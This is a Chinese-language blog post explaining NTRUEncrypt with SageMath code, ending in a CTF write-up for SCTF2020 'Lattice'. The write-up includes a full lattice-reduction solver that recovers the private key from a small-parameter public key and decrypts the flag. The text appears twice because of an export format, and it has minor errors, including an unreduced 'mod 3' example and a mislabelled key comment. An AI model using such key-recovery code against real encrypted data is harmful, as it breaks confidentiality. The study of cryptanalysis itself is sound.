卷积\n\n多项式卷积满足公式\n$$\n    a(x)*b(x) = c(x) \\ with \\ c_k = \\sum_{i+j=k \\pmod} a_i b_{k-i \\pmod{N}}\n$$\n举个栗子：\n$$\n    f(x)=-1+4x+x^2 \\\\\\\\\n    g(x)=3-x+5x^2\n$$\n注意此时多项式和级数类似，采用低次项在先的书写方式\n则\n$$\n    f(x)*g(x) = c(x) \\pmod{3}\n$$\n其中\n$$\nc_0 = \\sum_{i+j=0 \\pmod{N}} f_i g_{0-i} = f_0g_0 + f_1g_2 + f_2g_1 = -1 \\times 3 + 4 \\times 5 + 1 \\times (-1) = -3 + 20 + (-1) = 16 \\\\\\\\\nc_1 = f_0g_1 + f_1g_0 + f_2g_2 = -1 \\times (-1) + 4 \\times 3 + 1 \\times 5 = 1 + 12 + 5 = 18 \\\\\\\\\nc_2 = f_0g_2 + f_1g_1 + f_2g_0 = -1 \\times 5 + 4 \\times (-1) + 1 \\times 3 = -5 + (-4) + 3 = -6\n$$\n故\n$$\nc(x) = 16 + 18x - 6x^2\n$$\n代码如下：\n\n```python\ndef convolution(f,g):\n    ''' 多项式卷积运算'''\n    \n    return (f * g) % (x^N-1)\n```\n\n### 取模\n\n这里将多项式的每个系数 $f_i$ 拿出来，然后作变换 $g_i=(f_i+q/2)\\%q-q/2$ 再塞回去。这样每个系数都在 $[-q/2,q/2]$ 之间，这样可以保证模 $q$ 的运算。\n比如取 $q=3$ 时，有以下映射关系：\n$$\n-3 \\rightarrow (-3+1)\\%3 -1 = 0 \\\\\\\\\n-2 \\rightarrow (-2+1)\\%3 -1 = 1 \\\\\\\\\n-1 \\rightarrow (-1+1)\\%3 -1 = -1 \\\\\\\\\n0 \\rightarrow (0+1)\\%3-1 = 0 \\\\\\\\\n1 \\rightarrow (1+1)\\%3-1 = 1 \\\\\\\\\n2 \\rightarrow (2+1)\\%3-1 = -1 \\\\\\\\\n3 \\rightarrow (3+1)\\%3-1 = 0\n$$\n代码如下：\n\n```python\ndef balancedmod(f,q):\n    ''' 多项式取模'''\n\n    g = list(((f[i] + q//2) % q) - q//2 for i in range(N))\n    return Zx(g)\n```\n\n### 求逆元\n\n这也是我比较疑惑的一部分，一直不知道多项式的逆元具体怎么求，现在也看开了，随便怎么样吧，反正不是我手写（）\n这里先变基到 $X^N-1$ 商环然后求逆元再 lift 到整环上，关于原理我至今有点异或，有缘回来补坑吧。\n代码如下：\n\n```python\ndef invertmodprime(f,p):\n    ''' 假定 p 为素数,计算一个多项式模 x^N-1 下的逆元再模 p\n        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 p 为 1\n        不存在逆元时会抛出异常'''\n\n    T = Zx.change_ring(Integers(p)).quotient(x^N-1)\n    return Zx(lift(1 / T(f)))\n\ndef invertmodpowerof2(f,q):\n    ''' 假定 q 为 2 的幂，计算一个多项式模 x^N-1 下的逆元再模 q\n        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 q 为 1\n        不存在逆元时会抛出异常'''\n\n    assert q.is_power_of(2)     # 断言 q 是 2 的幂\n    h = invertmodprime(f,2)     # 首先求 f 模 2 的逆元\n    while True:\n        r = balancedmod(convolution(h,f),q)         # 计算 r = h * f (mod q)\n        if r == 1: return h                         # 若 h * f = 1 (mod q)，则返回 h 即为所求逆元\n        h = balancedmod(convolution(h,2 - r),q)     # 否则，h = h * (2 - r) (mod q)\n```\n\n## 攻击\n\n格约化攻击是一种非常著名的针对 NTRUEncrypt 的攻击，类似于 RSA 分解质因数。\n当选取的 $N$ 较小时，可以构造维度较低的格分解公钥 $h$ 。\n\n### 例题 SCTF2020-Lattice\n\n```python\nfrom base64 import b16encode\n\nZx.<x> = ZZ[]\nn = 109 \nq = 2048\np = 3\nDf = 9\nDg = 10\nDr = 11\n\ndef mul(f,g):\n    return (f * g) % (x^n-1)\n\ndef bal_mod(f,q):\n    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))\n    return Zx(g)\n\ndef random_poly(d):\n    assert d <= n\n    result = n*[0]\n    for j in range(d):\n        while True:\n            r = randrange(n)\n            if not result[r]: break\n        result[r] = 1-2*randrange(2)\n    return Zx(result)\n\ndef inv_mod_prime(f,p):\n    T = Zx.change_ring(Integers(p)).quotient(x^n-1)\n    return Zx(lift(1 / T(f)))\n\ndef inv_mod_powerof2(f,q):\n    assert q.is_power_of(2)\n    g = inv_mod_prime(f,2)\n    while True:\n        r = bal_mod(mul(g,f),q)\n        if r == 1: return g\n        g = bal_mod(mul(g,2 - r),q)\n\ndef keygen():\n    f = random_poly(Df)\n    while True:\n        try:\n            fp = inv_mod_prime(f,p)\n            fq = inv_mod_powerof2(f,q)\n            break\n        except:\n            f = random_poly(Df)\n    g = random_poly(Dg)\n    h = bal_mod(p * mul(fq,g),q)\n    pub_key = h\n    pri_key = [f,fp]\n    return pub_key,pri_key\n\ndef encrypt(m,h):\n    r = random_poly(Dr)\n    e = bal_mod(mul(h,r) + m,q)\n    return e\n\nif __name__ == '__main__':\n    pub_key,pri_key = keygen()\n    flag=b'SCTF{***********}'[5:-1]\n    m = Zx(list(bin(int(b16encode(flag), 16))[2:]))\n    print(m)\n    e = encrypt(m,pub_key)\n    print('pub_key=')\n    print(pub_key)\n    print('e=')\n    print(e)\n# pub_key=\n# 510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248\n# e=\n# -453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852\n```\n\n显然函数和上面的基本一样，只是名称相应地缩短了一下。\n攻击方法是构造如下的一个格，然后进行规约\n$$\n\\left(\n\\begin{array}{cccc|cccc}\n\\lambda & 0 & \\cdots & 0 & h_0 & h_1 & \\cdots & h_{N-1} \\\\\\\\\n0 & \\lambda & \\cdots & 0 & h_{N-1} & h_0 & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & 0 \\\\\\\\\n0 & 0 & \\cdots & \\lambda & h_1 & h_2 & \\cdots & h_0 \\\\\\\\ \\hline\n0 & 0 & \\cdots & 0 & q & 0 & \\cdots & 0 \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & q & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 0 & \\cdots & q\n\\end{array}\n\\right)\n$$\n具体可以参考这篇 Paper: <https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&rep=rep1&type=pdf>\n取 $\\lambda=1$ ，规约后最短向量即为 $[f\\enspace g]$ ，然后就可以计算私钥解密了。\nexp 如下：\n\n```python\nfrom Crypto.Util.number import *\nimport time\nstart = time.time()\nZx.<x> = ZZ[]\nn = 109 \nq = 2048\np = 3\nDf = 9\nDg = 10\nDr = 11\nh=510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248\ne=-453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852\n\n\ndef mul(f,g):\n    return (f * g) % (x^n-1)\ndef decrypt(pri_key,e):\n    f,fp = pri_key\n    a = bal_mod(mul(f,e),q)\n    b = bal_mod(mul(a,fp),p)\n    pt = ''.join([str(i) for i in b.list()])\n    return pt\ndef bal_mod(f,q):\n    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))\n    return Zx(g)\ndef lattice(h,q):\n    n = 109\n    # h = bal_mod(683*h,q)\n    grid = Matrix(ZZ,2*n,2*n)\n    cof = h.list()\n    offset = 0\n    for i in range(2*n):\n        for j in range(2*n):\n            if i<n:\n                if j < n:\n                    if i==j:\n                        grid[i,j] = 1\n                else:\n                    grid[i,j] = cof[(j-n-offset)%n]\n            elif j>=n and i==j:\n                grid[i,j] = q\n        offset += 1\n    GL = grid.BKZ()\n    return GL,grid\n\ndef inv_mod_prime(f,p):\n    T = Zx.change_ring(Integers(p)).quotient(x^n-1)\n    return Zx(lift(1 / T(f)))\n\nGL,grid = lattice(h,q)\nSVP = list(GL[0])\nf = Zx(SVP[:n])\ng = Zx(SVP[-n:])\na = bal_mod(mul(f,e),q)\nfp = inv_mod_prime(f,p)\npv = (f,fp)\nprint(decrypt(pv,e))\nflag = int(decrypt(pv,e)+'0'*6,2)\nprint(flag)\nprint(long_to_bytes(flag))\n\nend = time.time()\nprint(end-start)\n```\n\n********************************\n\n## 勘误\n\n维基百科中说 $m$ 转化成系数在 $[-p/2,p/2]$ 间多项式，实际应为 $\\{-1,0,1\\}$ 间。\n代码中加密函数原为`return balancedmod(convolution(public_key,p*r) + message,q)`，一般版本中的公钥是没乘 $p$ 的，在加密中才乘，但这里公钥已经乘过 $p$ 了，就可以删去。实测不删去也可正常解密，推测应该是在后面取模时消去了，读者可自行推导。\n\n## 参考\n\n<https://en.wikipedia.org/wiki/NTRUEncrypt>\n<https://github.com/joannawetesko/NTRU-cryptosystem/blob/master/NTRU.sage>\n<https://blog.csdn.net/sinat_36742186/article/details/83689529>\n","source":"_posts/NTRUEncrypt.md","raw":"---\ntitle: NTRUEncrypt\ndate: 2022-04-11 00:26:00\ntags: [数学,格,抽象代数,Crypto]\ncategories: 学习\n---\nNTRUEncrypt 公钥加密系统\n<!--more-->\n## 简介\n\n这里基本摘自维基百科，少少枯燥，可以自行选择略读。\n\nNTRUEncrypt 是一个公钥加密系统，它的安全性基于这样一个问题的困难性：在一个截断多项式环（这个翻译怪怪的）中**将一个给定的多项式分解成两个系数非常小的多项式的商**。\n由于加密与解密都只涉及简单的多项式乘法，故相比于其他的加密系统， NTRUEncrypt 的**效率会更高**。\n具体来说， NTRU 的操作基于截断多项式环中的对象 ${\\displaystyle \\ R=\\mathbb {Z} [X]/(X^{N}-1)}$ 中的**卷积乘法**，并且环上的所有多项式的系数和次数都为不大于 $N-1$ 的整数。\n实际上， NTRU 是一个参数化系统，每个系统由三个整数指定 $(N,p,q)$ ，其中 $N$ 代表截断环上的所有多项式的最高次为 $N-1$ ， $p$ 和 $q$ 分别代表一个小模数和一个大模数。其中 $N$ 为素数， $q$ 大于 $p$ ，且 $p$ 与 $q$ 互质。由这三个参数生成四个多项式 $\\mathcal {L}_f,\\mathcal {L}_g,\\mathcal {L}_m \\thinspace$ 和 $\\mathcal {L}_r$ ，分别为私钥、公钥、消息和干扰数。\n********************************\n看到这里，我相信懂的人都懂的，不懂的人还不懂（bushi）\n下面从宏观和微观两方面详细解释\n\n## 公钥生成\n\n又双叒叕来到了密码学的老 CP —— Alice 和 Bob\n![Alice&Bob](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fauthorize.zhongbi.net%2Fd%2Ffile%2Ftu%2F2018%2F12%2F27%2F0wlyvynx1dv.jpg&refer=http%3A%2F%2Fauthorize.zhongbi.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1652234696&t=c5802c1784650149a8a25e0440448985)\n\n1. Bob 根据选定的 $N,p,q$ 生成最高次为 $N-1$ 的 $f$ 和 $g$ **两个多项式**，并且系数在 $\\{-1,0,1\\}$ 中选取（可以认为这俩是在模 $X^{N}-1$ 的剩余类中）。 $f$ 还要满足**模 $q$ 和 $p$ 的逆元存在**，如果不满足，那就重新生成。\n2. 分别计算 $f$ 模 $p$ 和模 $q$ 的逆元，即 $f_{p}$ 和 $f_{q}$ ，**保留 $f$ , $f_{p}$ 及 $g$ 作为私钥，公钥 $h=pf_{q} \\cdot g\\ \\pmod{q} $ 。**\n\nsagemath 代码如下\n\n```python\ndef generate_keys():\n    ''' 基于提供的参数生成一个公私钥对\n        返回 f (私钥)和 F_p (公钥)'''\n\n    # 校验\n    if validate_params():\n        while True:\n            try:\n                # 生成两个随机多项式 f 和 g ，并且非零系数小于给定的 d\n                f = generate_polynomial(d)\n                g = generate_polynomial(d)\n\n                # 假定 q 是 2 的幂，求得 f 模 q 的逆元             \n                f_q = invertmodpowerof2(f,q)\n                # 同样假定 p 是素数，求得 f 模 p 的逆元\n                f_p = invertmodprime(f,p)  \n                break\n        \n            except:\n                # 上面如果抛出异常，即逆元不存在，则重新生成\n                pass \n    \n        # 公钥 h=pf_p*g (mod q)\n        public_key = balancedmod(p * convolution(f_q,g),q)\n\n        # 保留 f 和 f_p 作为私钥\n        secret_key = f,f_p\n\n        return public_key,secret_key\n\n    else:\n        print(\"Provided params are not correct. q and p should be co-prime, q should be a power of 2 considerably larger than p and p should be prime.\")\n\n```\n\n## 加密\n\nAlice 将消息 $m$ 转化成一个系数在 $\\{-1,0,1\\}$ 之间的多项式（比如转成二进制或三进制，二进制在这里会有些浪费），再随机生成一个系数较小（但不限于 $\\{-1,0,1\\}$ 中）的多项式 $r$ 作为干扰以掩盖消息。那么加密计算如下：\n$$\n    e=r \\cdot h+m \\pmod{q}\n$$\n举个栗子：\n当取 $N=5,p=3,q=32$ 时（呃这里待更新）\n$$\n    f=-1+X+X^2\n$$\n\n```python\ndef generate_message():\n    ''' 随机生成一个系数在{-1,0,1}中的多项式'''\n\n    result = list(randrange(3) - 1 for _ in range(N))\n    return Zx(result)\ndef encrypt(message, public_key):\n    ''' 基于提供的公钥加密消息'''\n\n    # 生成一个随机多项式，并且非零系数小于给定的d，作为干扰以掩盖消息   \n    r = generate_polynomial(d)\n\n    # 加密：e = r * h + m (mod q)\n    # while performing modulo operation, balance coefficients of encrypted_message \n    # for the integers in interval [-q/2, +q/2]\n    return balancedmod(convolution(public_key,r) + message,q)\n```\n\n## 解密\n\n由于其他人不知道 $r$ ，所以无法直接 $m=e-rh$ ，但 Bob 拿到 $e$ 后，可以计算出\n$$\n\\begin{equation*}\n\\begin{split}\n    a\n    & = f \\cdot e \\pmod{q}\\\\\\\\\n    & = f \\cdot (r \\cdot h+m) \\pmod{q}\\\\\\\\\n    & = f \\cdot (r \\cdot pf_{q} \\cdot g+m) \\pmod{q}\\\\\\\\\n    & = pr \\cdot g + f \\cdot m \\pmod{q}\n\\end{split}\n\\end{equation*}\n$$\n关键部分来了，以上都是在模 $q$ 下进行，而这时忽然就变成了模 $p$\n$$\nb=a=f \\cdot m \\pmod{p} \\\\\\\\\nc=f_{p} \\cdot b =f_{p} \\cdot f \\cdot m =m \\pmod{p}\n$$\n\n```python\ndef decrypt(encrypted_message, secret_key):\n    ''' 基于提供的私钥解密密文'''\n    \n    # 拿到私钥的两个多项式  \n    f,f_p = secret_key\n    \n    # a = f * e (mod p)\n    a = balancedmod(convolution(encrypted_message,f),q)\n     \n    # c = f_p * a (mod p)\n    return balancedmod(convolution(a,f_p),p)\n```\n\n## 函数实现\n\n下面从微观上解释一下上面函数的实现：\n\n### 卷积\n\n多项式卷积满足公式\n$$\n    a(x)*b(x) = c(x) \\ with \\ c_k = \\sum_{i+j=k \\pmod} a_i b_{k-i \\pmod{N}}\n$$\n举个栗子：\n$$\n    f(x)=-1+4x+x^2 \\\\\\\\\n    g(x)=3-x+5x^2\n$$\n注意此时多项式和级数类似，采用低次项在先的书写方式\n则\n$$\n    f(x)*g(x) = c(x) \\pmod{3}\n$$\n其中\n$$\nc_0 = \\sum_{i+j=0 \\pmod{N}} f_i g_{0-i} = f_0g_0 + f_1g_2 + f_2g_1 = -1 \\times 3 + 4 \\times 5 + 1 \\times (-1) = -3 + 20 + (-1) = 16 \\\\\\\\\nc_1 = f_0g_1 + f_1g_0 + f_2g_2 = -1 \\times (-1) + 4 \\times 3 + 1 \\times 5 = 1 + 12 + 5 = 18 \\\\\\\\\nc_2 = f_0g_2 + f_1g_1 + f_2g_0 = -1 \\times 5 + 4 \\times (-1) + 1 \\times 3 = -5 + (-4) + 3 = -6\n$$\n故\n$$\nc(x) = 16 + 18x - 6x^2\n$$\n代码如下：\n\n```python\ndef convolution(f,g):\n    ''' 多项式卷积运算'''\n    \n    return (f * g) % (x^N-1)\n```\n\n### 取模\n\n这里将多项式的每个系数 $f_i$ 拿出来，然后作变换 $g_i=(f_i+q/2)\\%q-q/2$ 再塞回去。这样每个系数都在 $[-q/2,q/2]$ 之间，这样可以保证模 $q$ 的运算。\n比如取 $q=3$ 时，有以下映射关系：\n$$\n-3 \\rightarrow (-3+1)\\%3 -1 = 0 \\\\\\\\\n-2 \\rightarrow (-2+1)\\%3 -1 = 1 \\\\\\\\\n-1 \\rightarrow (-1+1)\\%3 -1 = -1 \\\\\\\\\n0 \\rightarrow (0+1)\\%3-1 = 0 \\\\\\\\\n1 \\rightarrow (1+1)\\%3-1 = 1 \\\\\\\\\n2 \\rightarrow (2+1)\\%3-1 = -1 \\\\\\\\\n3 \\rightarrow (3+1)\\%3-1 = 0\n$$\n代码如下：\n\n```python\ndef balancedmod(f,q):\n    ''' 多项式取模'''\n\n    g = list(((f[i] + q//2) % q) - q//2 for i in range(N))\n    return Zx(g)\n```\n\n### 求逆元\n\n这也是我比较疑惑的一部分，一直不知道多项式的逆元具体怎么求，现在也看开了，随便怎么样吧，反正不是我手写（）\n这里先变基到 $X^N-1$ 商环然后求逆元再 lift 到整环上，关于原理我至今有点异或，有缘回来补坑吧。\n代码如下：\n\n```python\ndef invertmodprime(f,p):\n    ''' 假定 p 为素数,计算一个多项式模 x^N-1 下的逆元再模 p\n        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 p 为 1\n        不存在逆元时会抛出异常'''\n\n    T = Zx.change_ring(Integers(p)).quotient(x^N-1)\n    return Zx(lift(1 / T(f)))\n\ndef invertmodpowerof2(f,q):\n    ''' 假定 q 为 2 的幂，计算一个多项式模 x^N-1 下的逆元再模 q\n        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 q 为 1\n        不存在逆元时会抛出异常'''\n\n    assert q.is_power_of(2)     # 断言 q 是 2 的幂\n    h = invertmodprime(f,2)     # 首先求 f 模 2 的逆元\n    while True:\n        r = balancedmod(convolution(h,f),q)         # 计算 r = h * f (mod q)\n        if r == 1: return h                         # 若 h * f = 1 (mod q)，则返回 h 即为所求逆元\n        h = balancedmod(convolution(h,2 - r),q)     # 否则，h = h * (2 - r) (mod q)\n```\n\n## 攻击\n\n格约化攻击是一种非常著名的针对 NTRUEncrypt 的攻击，类似于 RSA 分解质因数。\n当选取的 $N$ 较小时，可以构造维度较低的格分解公钥 $h$ 。\n\n### 例题 SCTF2020-Lattice\n\n```python\nfrom base64 import b16encode\n\nZx.<x> = ZZ[]\nn = 109 \nq = 2048\np = 3\nDf = 9\nDg = 10\nDr = 11\n\ndef mul(f,g):\n    return (f * g) % (x^n-1)\n\ndef bal_mod(f,q):\n    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))\n    return Zx(g)\n\ndef random_poly(d):\n    assert d <= n\n    result = n*[0]\n    for j in range(d):\n        while True:\n            r = randrange(n)\n            if not result[r]: break\n        result[r] = 1-2*randrange(2)\n    return Zx(result)\n\ndef inv_mod_prime(f,p):\n    T = Zx.change_ring(Integers(p)).quotient(x^n-1)\n    return Zx(lift(1 / T(f)))\n\ndef inv_mod_powerof2(f,q):\n    assert q.is_power_of(2)\n    g = inv_mod_prime(f,2)\n    while True:\n        r = bal_mod(mul(g,f),q)\n        if r == 1: return g\n        g = bal_mod(mul(g,2 - r),q)\n\ndef keygen():\n    f = random_poly(Df)\n    while True:\n        try:\n            fp = inv_mod_prime(f,p)\n            fq = inv_mod_powerof2(f,q)\n            break\n        except:\n            f = random_poly(Df)\n    g = random_poly(Dg)\n    h = bal_mod(p * mul(fq,g),q)\n    pub_key = h\n    pri_key = [f,fp]\n    return pub_key,pri_key\n\ndef encrypt(m,h):\n    r = random_poly(Dr)\n    e = bal_mod(mul(h,r) + m,q)\n    return e\n\nif __name__ == '__main__':\n    pub_key,pri_key = keygen()\n    flag=b'SCTF{***********}'[5:-1]\n    m = Zx(list(bin(int(b16encode(flag), 16))[2:]))\n    print(m)\n    e = encrypt(m,pub_key)\n    print('pub_key=')\n    print(pub_key)\n    print('e=')\n    print(e)\n# pub_key=\n# 510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248\n# e=\n# -453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 